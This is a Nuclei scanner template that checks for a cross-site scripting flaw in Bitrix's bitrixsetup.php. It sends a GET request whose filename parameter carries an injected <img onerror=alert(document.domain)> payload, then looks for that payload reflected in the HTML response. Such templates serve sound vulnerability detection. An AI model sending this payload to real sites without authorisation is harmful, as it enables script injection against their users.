http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src='' onerror=alert(document.domain)>' in read mode
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bitrixsetup.php?action=UNPACK&filename=<img src='''' onerror=alert(document.domain)>'
id: bitrixsetup-xss
info:
  author: man3ki_n3ko, gtrrnr
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
    cvss-score: 4.3
  description: Bitrixsetup script allows XSS via the filename parameter.
  name: Bitrixsetup cross-site scripting
  reference:
  - https://habr.com/ru/companies/deiteriylab/articles/806285/
  - https://bdu.fstec.ru/vul/2024-01501
  severity: medium
  tags: xss,bitrix,bitrixsetup
